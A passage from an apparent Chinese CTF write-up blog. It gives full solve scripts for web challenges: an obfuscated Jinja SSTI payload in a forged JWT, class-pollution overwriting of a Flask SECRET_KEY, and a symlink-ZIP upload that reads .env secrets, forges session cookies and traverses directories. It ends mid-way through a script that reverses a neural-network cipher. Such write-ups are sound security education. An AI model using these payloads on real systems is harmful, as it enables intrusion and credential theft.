class="built_in">bytes</span>:</span><br><span class="line">    <span class="keyword">return</span> base64.urlsafe_b64encode(data).rstrip(<span class="string">b&quot;=&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 伪造带有 SSTI 载荷的管理员 JWT</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">craft_token</span>(<span class="params">secret: <span class="built_in">str</span></span>) -&gt; <span class="built_in">str</span>:</span><br><span class="line">    header = &#123;<span class="string">&quot;alg&quot;</span>: <span class="string">&quot;HS256&quot;</span>, <span class="string">&quot;typ&quot;</span>: <span class="string">&quot;JWT&quot;</span>&#125;</span><br><span class="line">    <span class="comment"># 利用 hello/hacker 的替换逻辑，将表达式包裹成 &#123;&#123; ... &#125;&#125; 并读取 /flag</span></span><br><span class="line">    ssti_payload = (</span><br><span class="line">        <span class="string">&quot;hello (((lipsum|attr(&#x27;__&#x27; ~ (&#x27;%c&#x27;%103) ~ &#x27;lobals__&#x27;))[&#x27;__buil&#x27; ~ &#x27;tins__&#x27;]&quot;</span></span><br><span class="line">        <span class="string">&quot;[&#x27;o&#x27; ~ &#x27;pen&#x27;](&#x27;/&#x27; ~ &#x27;fla&#x27; ~ (&#x27;%c&#x27;%103)))|attr(&#x27;re&#x27; ~ &#x27;ad&#x27;)()) hacker&quot;</span></span><br><span class="line">    )</span><br><span class="line">    body = &#123;<span class="string">&quot;user&quot;</span>: ssti_payload, <span class="string">&quot;role&quot;</span>: <span class="string">&quot;admin&quot;</span>&#125;</span><br><span class="line"></span><br><span class="line">    header_b64 = b64url(json.dumps(header, separators=(<span class="string">&quot;,&quot;</span>, <span class="string">&quot;:&quot;</span>)).encode())</span><br><span class="line">    body_b64 = b64url(json.dumps(body, separators=(<span class="string">&quot;,&quot;</span>, <span class="string">&quot;:&quot;</span>)).encode())</span><br><span class="line">    signing_input = header_b64 + <span class="string">b&quot;.&quot;</span> + body_b64</span><br><span class="line">    signature = b64url(hmac.new(secret.encode(), signing_input, hashlib.sha256).digest())</span><br><span class="line">    <span class="keyword">return</span> (signing_input + <span class="string">b&quot;.&quot;</span> + signature).decode()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 滥用 merge 合并漏洞覆盖 Flask SECRET_KEY</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">poison_secret</span>(<span class="params">base_url: <span class="built_in">str</span>, new_secret: <span class="built_in">str</span></span>) -&gt; <span class="literal">None</span>:</span><br><span class="line">    payload = &#123;</span><br><span class="line">        <span class="string">&quot;username&quot;</span>: <span class="string">&quot;attacker&quot;</span>,</span><br><span class="line">        <span class="string">&quot;password&quot;</span>: <span class="string">&quot;pass&quot;</span>,</span><br><span class="line">        <span class="string">&quot;__class__&quot;</span>: &#123;</span><br><span class="line">            <span class="string">&quot;__init__&quot;</span>: &#123;</span><br><span class="line">                <span class="string">&quot;__globals__&quot;</span>: &#123;</span><br><span class="line">                    <span class="string">&quot;app&quot;</span>: &#123;</span><br><span class="line">                        <span class="string">&quot;config&quot;</span>: &#123;</span><br><span class="line">                            <span class="string">&quot;SECRET_KEY&quot;</span>: new_secret,</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;,</span><br><span class="line">    &#125;</span><br><span class="line">    session = requests.Session()</span><br><span class="line">    session.trust_env = <span class="literal">False</span></span><br><span class="line">    resp = session.post(<span class="string">f&quot;<span class="subst">&#123;base_url&#125;</span>/register&quot;</span>, json=payload, proxies=&#123;<span class="string">&quot;http&quot;</span>: <span class="literal">None</span>, <span class="string">&quot;https&quot;</span>: <span class="literal">None</span>&#125;)</span><br><span class="line">    resp.raise_for_status()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exploit</span>(<span class="params">base_url: <span class="built_in">str</span>, secret: <span class="built_in">str</span></span>) -&gt; <span class="built_in">str</span>:</span><br><span class="line">    poison_secret(base_url, secret)</span><br><span class="line">    token = craft_token(secret)</span><br><span class="line">    session = requests.Session()</span><br><span class="line">    session.trust_env = <span class="literal">False</span></span><br><span class="line">    headers = &#123;<span class="string">&quot;Authorization&quot;</span>: <span class="string">f&quot;Bearer <span class="subst">&#123;token&#125;</span>&quot;</span>&#125;</span><br><span class="line">    resp = session.get(<span class="string">f&quot;<span class="subst">&#123;base_url&#125;</span>/protected&quot;</span>, headers=headers, proxies=&#123;<span class="string">&quot;http&quot;</span>: <span class="literal">None</span>, <span class="string">&quot;https&quot;</span>: <span class="literal">None</span>&#125;)</span><br><span class="line">    resp.raise_for_status()</span><br><span class="line">    <span class="keyword">return</span> resp.text</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>() -&gt; <span class="literal">None</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        result = exploit(BASE_URL, SECRET)</span><br><span class="line">        <span class="built_in">print</span>(result)</span><br><span class="line">    <span class="keyword">except</span> requests.RequestException <span class="keyword">as</span> exc:</span><br><span class="line">        <span class="keyword">raise</span> SystemExit(<span class="string">f&quot;failed: <span class="subst">&#123;exc&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20251013104959726.png" alt="image-20251013104959726"></p>
<p>TSCTF-J{y0u_c0mp1373d_7h3_py_pr0813m}!</p>
<h3 id="FileSystem"><a href="#FileSystem" class="headerlink" title="FileSystem"></a>FileSystem</h3><p>上传 ZIP 时使用系统 unzip，不会过滤符号链接，可在个人上传目录写入一个指向 &#x2F; 的软链接（示例命名为 root），随后通过 &#x2F;files&#x2F;root&#x2F;&lt;路径&gt; 访问宿主文件系统。</p>
<p>先访问 &#x2F;files&#x2F;root&#x2F;app&#x2F;.env 泄露 SESSION_SECRET，再读 &#x2F;files&#x2F;root&#x2F;app&#x2F;server.js 获取 store.set(‘…’) 中的开发者会话 UUID。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">用 SESSION_SECRET 对该 UUID 计算 connect.sid（s:&lt;uuid&gt;.&lt;HMAC&gt;），设置此 cookie 并伪造请求头 X-Forwarded-For: 127.0.0.1，即可满足 developmentOnly 中“本地开发者”条件并访问 /debug/files。</span><br></pre></td></tr></table></figure>

<p>&#x2F;debug&#x2F;files 接受外部传入的 sessionId，缺乏路径限制。传入 ..&#x2F;..&#x2F;..&#x2F;..&#x2F;.. 等遍历值即可列出真正的根目录，发现入口脚本随机生成的 8 位目录名。</p>
<p>最后再上传一个软链接（如 flag 指向 &#x2F;&lt;随机目录&gt;&#x2F;flag.txt），通过 &#x2F;files&#x2F;flag 成功读取 flag。</p>
<ol>
<li>上传带有符号链接的 ZIP，读取 &#x2F;app&#x2F;.env 和 &#x2F;app&#x2F;server.js，获取 SESSION_SECRET 与开发者会话 UUID。</li>
<li>使用密钥伪造 connect.sid，访问 &#x2F;debug&#x2F;files 并目录穿越枚举根目录，确定随机 flag 目录。</li>
<li>再次上传指向 flag.txt 的符号链接，通过 &#x2F;files&#x2F;flag 直接获取 flag。</li>
</ol>
<p>AI写脚本太强了 0.0</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> hmac</span><br><span class="line"><span class="keyword">import</span> io</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> zipfile</span><br><span class="line"><span class="keyword">from</span> typing <span class="keyword">import</span> <span class="type">Dict</span>, <span class="type">List</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">BASE_URL = <span class="string">&quot;http://127.0.0.1:56046&quot;</span></span><br><span class="line">ROOT_HEADERS = &#123;<span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;solve.py&quot;</span>&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">build_zip</span>(<span class="params">symlinks: <span class="type">Dict</span>[<span class="built_in">str</span>, <span class="built_in">str</span>]</span>) -&gt; <span class="built_in">bytes</span>:</span><br><span class="line">    <span class="string">&quot;&quot;&quot;构造包含符号链接的 ZIP 二进制数据。&quot;&quot;&quot;</span></span><br><span class="line">    buf = io.BytesIO()</span><br><span class="line">    <span class="keyword">with</span> zipfile.ZipFile(buf, <span class="string">&quot;w&quot;</span>) <span class="keyword">as</span> zf:</span><br><span class="line">        <span class="keyword">for</span> name, target <span class="keyword">in</span> symlinks.items():</span><br><span class="line">            entry = zipfile.ZipInfo(name)</span><br><span class="line">            entry.create_system = <span class="number">3</span>            <span class="comment"># 指定 *nix 平台，允许符号链接</span></span><br><span class="line">            entry.external_attr = <span class="number">0o120777</span> &lt;&lt; <span class="number">16</span></span><br><span class="line">            zf.writestr(entry, target)</span><br><span class="line">    buf.seek(<span class="number">0</span>)</span><br><span class="line">    <span class="keyword">return</span> buf.getvalue()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">upload_zip</span>(<span class="params">sess: requests.Session, mapping: <span class="type">Dict</span>[<span class="built_in">str</span>, <span class="built_in">str</span>]</span>) -&gt; <span class="literal">None</span>:</span><br><span class="line">    <span class="string">&quot;&quot;&quot;上传符号链接 ZIP 到 /upload。&quot;&quot;&quot;</span></span><br><span class="line">    payload = build_zip(mapping)</span><br><span class="line">    files = &#123;<span class="string">&quot;zipfile&quot;</span>: (<span class="string">&quot;exploit.zip&quot;</span>, payload, <span class="string">&quot;application/zip&quot;</span>)&#125;</span><br><span class="line">    resp = sess.post(<span class="string">f&quot;<span class="subst">&#123;BASE_URL&#125;</span>/upload&quot;</span>, files=files, headers=ROOT_HEADERS, allow_redirects=<span class="literal">False</span>, timeout=<span class="number">10</span>)</span><br><span class="line">    <span class="keyword">if</span> resp.status_code != <span class="number">302</span>:</span><br><span class="line">        <span class="keyword">raise</span> RuntimeError(<span class="string">f&quot;上传 ZIP 失败，HTTP <span class="subst">&#123;resp.status_code&#125;</span>：<span class="subst">&#123;resp.text[:<span class="number">200</span>]&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">fetch_named_file</span>(<span class="params">sess: requests.Session, name: <span class="built_in">str</span></span>) -&gt; <span class="built_in">str</span>:</span><br><span class="line">    <span class="string">&quot;&quot;&quot;通过 /files/&lt;name&gt; 读取文件内容。&quot;&quot;&quot;</span></span><br><span class="line">    resp = sess.get(<span class="string">f&quot;<span class="subst">&#123;BASE_URL&#125;</span>/files/<span class="subst">&#123;name&#125;</span>&quot;</span>, headers=ROOT_HEADERS, timeout=<span class="number">10</span>)</span><br><span class="line">    <span class="keyword">if</span> resp.status_code != <span class="number">200</span>:</span><br><span class="line">        <span class="keyword">raise</span> RuntimeError(<span class="string">f&quot;读取 <span class="subst">&#123;name&#125;</span> 失败，HTTP <span class="subst">&#123;resp.status_code&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> resp.text</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sign_cookie</span>(<span class="params">value: <span class="built_in">str</span>, secret: <span class="built_in">str</span></span>) -&gt; <span class="built_in">str</span>:</span><br><span class="line">    <span class="string">&quot;&quot;&quot;根据 express-session 规则签名 connect.sid。&quot;&quot;&quot;</span></span><br><span class="line">    mac = hmac.new(secret.encode(), value.encode(), hashlib.sha256).digest()</span><br><span class="line">    sig = base64.b64encode(mac).decode().rstrip(<span class="string">&quot;=&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">f&quot;s:<span class="subst">&#123;value&#125;</span>.<span class="subst">&#123;sig&#125;</span>&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug_list</span>(<span class="params">dev_sess: requests.Session, session_id: <span class="built_in">str</span></span>) -&gt; <span class="type">List</span>[<span class="built_in">str</span>]:</span><br><span class="line">    <span class="string">&quot;&quot;&quot;访问 /debug/files 并解析返回的文件名列表。&quot;&quot;&quot;</span></span><br><span class="line">    headers = <span class="built_in">dict</span>(ROOT_HEADERS)</span><br><span class="line">    headers[<span class="string">&quot;X-Forwarded-For&quot;</span>] = <span class="string">&quot;127.0.0.1&quot;</span></span><br><span class="line">    params = &#123;<span class="string">&quot;sessionId&quot;</span>: session_id&#125;</span><br><span class="line">    resp = dev_sess.get(<span class="string">f&quot;<span class="subst">&#123;BASE_URL&#125;</span>/debug/files&quot;</span>, headers=headers, params=params, timeout=<span class="number">10</span>)</span><br><span class="line">    <span class="keyword">if</span> resp.status_code != <span class="number">200</span>:</span><br><span class="line">        <span class="keyword">raise</span> RuntimeError(<span class="string">f&quot;/debug/files 访问失败，HTTP <span class="subst">&#123;resp.status_code&#125;</span>：<span class="subst">&#123;resp.text[:<span class="number">200</span>]&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> re.findall(<span class="string">r&#x27;&lt;li class=&quot;list-group-item&quot;&gt;\s*([^&lt;\s]+)&#x27;</span>, resp.text)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>() -&gt; <span class="literal">None</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[+] 步骤 0：初始化普通用户会话&quot;</span>)</span><br><span class="line">    user = requests.Session()</span><br><span class="line">    user.get(BASE_URL + <span class="string">&quot;/&quot;</span>, headers=ROOT_HEADERS, timeout=<span class="number">10</span>)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[+] 步骤 1：上传 env/server 符号链接 ZIP&quot;</span>)</span><br><span class="line">    upload_zip(user, &#123;<span class="string">&quot;env&quot;</span>: <span class="string">&quot;/app/.env&quot;</span>, <span class="string">&quot;server&quot;</span>: <span class="string">&quot;/app/server.js&quot;</span>&#125;)</span><br><span class="line"></span><br><span class="line">    env_content = fetch_named_file(user, <span class="string">&quot;env&quot;</span>)</span><br><span class="line">    match_secret = re.search(<span class="string">r&quot;SESSION_SECRET=(.+)&quot;</span>, env_content)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> match_secret:</span><br><span class="line">        <span class="keyword">raise</span> RuntimeError(<span class="string">&quot;未能在 .env 中找到 SESSION_SECRET&quot;</span>)</span><br><span class="line">    session_secret = match_secret.group(<span class="number">1</span>).strip()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;[+] SESSION_SECRET = <span class="subst">&#123;session_secret&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">    server_js = fetch_named_file(user, <span class="string">&quot;server&quot;</span>)</span><br><span class="line">    match_dev = re.search(<span class="string">r&quot;store\.set\(&#x27;([^&#x27;]+)&#x27;\s*,&quot;</span>, server_js)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> match_dev:</span><br><span class="line">        <span class="keyword">raise</span> RuntimeError(<span class="string">&quot;未能在 server.js 中找到开发会话 UUID&quot;</span>)</span><br><span class="line">    dev_session_id = match_dev.group(<span class="number">1</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;[+] 开发者会话 UUID = <span class="subst">&#123;dev_session_id&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[+] 步骤 2：伪造 connect.sid 并访问 /debug/files&quot;</span>)</span><br><span class="line">    dev = requests.Session()</span><br><span class="line">    connect_sid = sign_cookie(dev_session_id, session_secret)</span><br><span class="line">    dev.cookies.<span class="built_in">set</span>(<span class="string">&quot;connect.sid&quot;</span>, connect_sid, domain=<span class="string">&quot;127.0.0.1&quot;</span>, path=<span class="string">&quot;/&quot;</span>)</span><br><span class="line"></span><br><span class="line">    root_entries = debug_list(dev, <span class="string">&quot;../../../../..&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;[+] 根目录条目：<span class="subst">&#123;root_entries&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">    flag_dir = <span class="built_in">next</span>((name <span class="keyword">for</span> name <span class="keyword">in</span> root_entries <span class="keyword">if</span> re.fullmatch(<span class="string">r&quot;[a-z0-9]&#123;8&#125;&quot;</span>, name)), <span class="literal">None</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> flag_dir:</span><br><span class="line">        <span class="keyword">raise</span> RuntimeError(<span class="string">&quot;未找到符合格式的 flag 目录名&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;[+] Flag 目录 = /<span class="subst">&#123;flag_dir&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[+] 步骤 3：上传指向 flag.txt 的符号链接并读取&quot;</span>)</span><br><span class="line">    upload_zip(user, &#123;<span class="string">&quot;flag&quot;</span>: <span class="string">f&quot;/<span class="subst">&#123;flag_dir&#125;</span>/flag.txt&quot;</span>&#125;)</span><br><span class="line">    flag_content = fetch_named_file(user, <span class="string">&quot;flag&quot;</span>).strip()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;[+] Flag = <span class="subst">&#123;flag_content&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        main()</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> exc:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;[-] 运行失败：<span class="subst">&#123;exc&#125;</span>&quot;</span>, file=sys.stderr)</span><br><span class="line">        sys.exit(<span class="number">1</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20251013105656157.png" alt="image-20251013105656157"></p>
<p>TSCTF-J{@r3-yOu-a_SYMboIIC-LiNK-m4St3R?274e7a}</p>
<h2 id="AI"><a href="#AI" class="headerlink" title="AI"></a>AI</h2><h3 id="JustReverse"><a href="#JustReverse" class="headerlink" title="JustReverse"></a>JustReverse</h3><p>AI逆向题</p>
<p>可以看到原流程，把 flag 逐字符转成 8 位二进制 ，组成张量后，依次经过 conv1、conv2、linear、conv3，最后写成 ciphertext.txt。</p>
<p>因为 conv1 权重是 [1,2;4,8] 且 conv2 只有 0.5 的权重、正偏置，ReLU 永远不会把值裁掉，相当于把每 4 位二进制压成一个 0–15 的整数之后线性放大，对应关系可以反推。</p>
<p>关键是 model.pth 内已经存了所有权重，用 unzip + 伪造 torch 模块即可用 pickle 读出，再用 numpy 分别逆向：先从 ciphertext.txt 里减去 conv3.bias，按照卷积公式顺序解开 2×2 卷积；得到的 58×58 矩阵 reshape 成向量，减去 linear.bias，利用 np.linalg.lstsq 求解线性方程组拿回 conv2 的输出。</p>
<p>最后把线性层输出还原到 0–15 之间的数字，再根据 [1,2,4,8] 的系数拆回每 4 位二进制，合并为 flag 字符。整个过程就是顺序逆操作 + 线性求解。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> zipfile, pickle, types, sys, io</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"></span><br><span class="line">torch = types.ModuleType(<span class="string">&#x27;torch&#x27;</span>)</span><br><span class="line">sys.modules[<span class="string">&#x27;torch&#x27;</span>] = torch</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">FloatStorage</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, size=<span class="number">0</span></span>):</span><br><span class="line">        <span class="variable language_">self</span>.size = size</span><br><span class="line"></span><br><span class="line">torch.FloatStorage = FloatStorage</span><br><span class="line">utils = types.ModuleType(<span class="string">&#x27;torch._utils&#x27;</span>)</span><br><span class="line">sys.modules[<span class="string">&#x27;torch._utils&#x27;</span>] = utils</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">default_stride</span>(<span class="params">size</span>):</span><br><span class="line">    acc = <span class="number">1</span></span><br><span class="line">    strides = []</span><br><span class="line">    <span class="keyword">for</span> s <span class="keyword">in</span> <span class="built_in">reversed</span>(size):</span><br><span class="line">        strides.insert(<span class="number">0</span>, acc)</span><br><span class="line">        acc *= s</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">tuple</span>(strides)</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">StorageWrapper</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, array</span>):</span><br><span class="line">        <span class="variable language_">self</span>.array = array</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">TensorWrapper</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, array</span>):</span><br><span class="line">        <span class="variable language_">self</span>.array = array</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">_rebuild_tensor_v2</span>(<span class="params">storage_obj, storage_offset, size, stride, *_</span>):</span><br><span class="line">    size = <span class="built_in">tuple</span>(size)</span><br><span class="line">    stride = <span class="built_in">tuple</span>(stride)</span><br><span class="line">    base = storage_obj.array</span><br><span class="line">    off = storage_offset</span><br><span class="line">    count = <span class="built_in">int</span>(np.prod(size, dtype=<span class="built_in">int</span>))</span><br><span class="line">    <span class="keyword">if</span> stride == default_stride(size):</span><br><span class="line">        arr = base[off:off + count].reshape(size).copy()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        byte_strides = <span class="built_in">tuple</span>(s * base.dtype.itemsize <span class="keyword">for</span> s <span class="keyword">in</span> stride)</span><br><span class="line">        arr = np.lib.stride_tricks.as_strided(base[off:], shape=size, strides=byte_strides).copy()</span><br><span class="line">    <span class="keyword">return</span> TensorWrapper(arr)</span><br><span class="line"></span><br><span class="line">utils._rebuild_tensor_v2 = _rebuild_tensor_v2</span><br><span class="line"></span><br><span class="line">storages = &#123;&#125;</span><br><span class="line">zf = zipfile.ZipFile(<span class="string">&#x27;model.pth&#x27;</span>, <span class="string">&#x27;r&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">MyUnpickler</span>(pickle.Unpickler):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">persistent_load</span>(<span class="params">self, pid</span>):</span><br><span class="line">        kind, _, key, _, _ = pid</span><br><span class="line">        <span class="keyword">if</span> kind != <span class="string">&#x27;storage&#x27;</span>:</span><br><span class="line">            <span class="keyword">raise</span> RuntimeError(<span class="string">&#x27;unexpected persistent object&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> key <span class="keyword">not</span> <span class="keyword">in</span> storages:</span><br><span class="line">            raw = zf.read(<span class="string">f&#x27;model/data/<span class="subst">&#123;key&#125;</span>&#x27;</span>)</span><br><span class="line">            arr = np.frombuffer(raw, dtype=<span class="string">&#x27;&lt;f4&#x27;</span>).copy()</span><br><span class="line">            storages[key] = StorageWrapper(arr)</span><br><span class="line">        <span class="keyword">return</span> storages[key]</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> zf.<span class="built_in">open</span>(<span class="string">&#x27;model/data.pkl&#x27;</span>, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    state_dict = MyUnpickler(io.BytesIO(f.read())).load()</span><br><span class="line"></span><br><span class="line">params = &#123;k: v.array <span class="keyword">for</span> k, v <span class="keyword">in</span> state_dict.items()&#125;</span><br><span class="line">conv1_w = params[<span class="string">&#x27;conv1.weight&#x27;</span>][<span class="number">0</span>, <span class="number">0</span>]</span><br><span class="line">conv1_b = params[<span class="string">&#x27;conv1.bias&#x27;</span>][<span class="number">0</span>]</span><br><span class="line">conv2_w = params[<span class="string">&#x27;conv2.weight&#x27;</span>][<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span 